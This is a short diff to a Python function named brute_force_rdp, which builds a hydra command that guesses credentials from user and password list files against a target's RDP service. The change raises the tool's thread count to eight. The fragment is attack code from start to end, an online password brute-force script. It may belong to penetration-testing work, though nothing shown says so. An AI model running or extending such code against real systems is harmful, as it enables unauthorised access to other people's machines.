@@ -18,6 +18,7 @@ def brute_force_rdp(target_ip, users_file='users.txt', passwords_file='passwords
         'hydra',
         '-L', users_file,
         '-P', passwords_file,
+        '-t', '8',
         target_ip,
         'rdp',
         '-V',
